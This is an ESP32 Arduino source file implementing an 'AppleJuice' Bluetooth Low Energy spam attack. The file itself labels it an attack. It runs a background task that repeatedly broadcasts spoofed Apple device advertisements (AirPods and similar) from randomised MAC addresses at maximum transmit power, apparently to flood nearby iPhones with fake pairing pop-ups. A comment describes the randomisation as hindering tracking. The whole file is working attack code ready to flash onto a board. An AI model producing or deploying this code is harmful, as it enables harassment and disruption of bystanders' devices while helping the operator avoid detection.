#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <esp_arduino_version.h>
#include <Adafruit_NeoPixel.h>
#include "devices.hpp"

#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21  // ESP32C3 ESP32C2 ESP32S3
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
#define MAX_TX_POWER ESP_PWR_LVL_P20  // ESP32H2 ESP32C6
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9   // Default
#endif
#define LED_PIN 48         // 板载RGB灯珠的引脚，根据实际使用的开发板型号而定
#define LED_COUNT 1         // LED灯条的灯珠数量（板载的是一颗）

Adafruit_NeoPixel strip(LED_COUNT, LED_PIN, NEO_GRB + NEO_KHZ800);

BLEAdvertising *pAdvertising;  // global variable
uint32_t delayMilliseconds = 800;

TaskHandle_t attackTaskHandle = NULL; // 任务句柄
uint8_t applejuice_flag = 0; // 攻击状态
int flag = 1; // 显示状态
int i = 0;

void applejuice_init() {
  Serial.begin(115200);
  Serial.println("Starting ESP32 BLE");
  strip.begin();
  strip.setBrightness(255); // 设置亮度（0-255范围）
  // This is specific to the AirM2M ESP32 board
  // https://wiki.luatos.com/chips/esp32c3/board.html
  pinMode(12, OUTPUT);
  pinMode(13, OUTPUT);
  
  BLEDevice::init("AirPods 69");

  // Increase the BLE Power to 21dBm (MAX)
  // https://docs.espressif.com/projects/esp-idf/en/stable/esp32c3/api-reference/bluetooth/controller_vhci.html
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

  // Create the BLE Server
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  // seems we need to init it with an address in setup() step.
  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}

void attack(uint8_t applejuice_flag) {
  while (applejuice_flag) {
    // Turn lights on during "busy" part
    digitalWrite(12, HIGH);
    digitalWrite(13, HIGH);
    switch (i) {
      case 0:
        strip.setPixelColor(0, strip.Color(255, 0, 0)); // 设置灯珠为红色 (R, G, B)
        break;
      case 1:
        strip.setPixelColor(0, strip.Color(0, 255, 0)); // 设置灯珠为绿色
        break;
      case 2:
        strip.setPixelColor(0, strip.Color(0, 0, 255)); // 设置灯珠为蓝色
        i = -1;
        break;
      default:
        break;
    }
    i++;
    strip.show(); // 显示颜色

    // First generate fake random MAC
    esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    for (int i = 0; i < 6; i++) {
      dummy_addr[i] = random(256);

      // It seems for some reason first 4 bits
      // Need to be high (aka 0b1111), so we 
      // OR with 0xF0
      if (i == 0) {
        dummy_addr[i] |= 0xF0;
      }
    }

    BLEAdvertisementData oAdvertisementData;

    // Randomly pick data from one of the devices
    // First decide short or long
    // 0 = long (headphones), 1 = short (misc stuff like Apple TV)
    int device_choice = random(2);
    if (device_choice == 0) {
      int index = random(17);
      #ifdef ESP_ARDUINO_VERSION_MAJOR
        #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
          oAdvertisementData.addData(String((char*)DEVICES[index], 31));
        #else
          oAdvertisementData.addData(std::string((char*)DEVICES[index], 31));
        #endif
      #endif
    } else {
      int index = random(13);
      #ifdef ESP_ARDUINO_VERSION_MAJOR
        #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
          oAdvertisementData.addData(String((char*)SHORT_DEVICES[index], 23));
        #else
          oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[index], 23));
        #endif
      #endif
    }

    int adv_type_choice = random(3);
    if (adv_type_choice == 0) {
      pAdvertising->setAdvertisementType(ADV_TYPE_IND);
    } else if (adv_type_choice == 1) {
      pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
    } else {
      pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
    }

    // Set the device address, advertisement data
    pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
    pAdvertising->setAdvertisementData(oAdvertisementData);

    // Start advertising
    Serial.println("Sending Advertisement...");
    pAdvertising->start();

    // Turn lights off while "sleeping"
    digitalWrite(12, LOW);
    digitalWrite(13, LOW);
    delay(delayMilliseconds); // delay for delayMilliseconds ms
    pAdvertising->stop();

    // Random signal strength increases the difficulty of tracking the signal
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
  }
}

void start_attack_task() {
  applejuice_flag = true;
  xTaskCreatePinnedToCore(
    [](void* param) {
      attack(applejuice_flag);
    },
    "AttackTask",
    8192,
    nullptr,
    1,
    &attackTaskHandle,
    1
  );
}

void stop_attack_task() {
  applejuice_flag = false;
  if (attackTaskHandle != NULL) {
    vTaskDelete(attackTaskHandle);
    
    
    // 强制停止 BLE 广告
    pAdvertising->stop();
    delay(10);
    attackTaskHandle = NULL;
    
    // 强制停止 BLE 广告
    pAdvertising->stop();
    // 重置 GPIO 和 LED
    // digitalWrite(12, LOW);
    // digitalWrite(13, LOW);
    strip.clear();
    strip.show();

    // Serial.println("Attack task stopped and resources cleaned.");
  }
}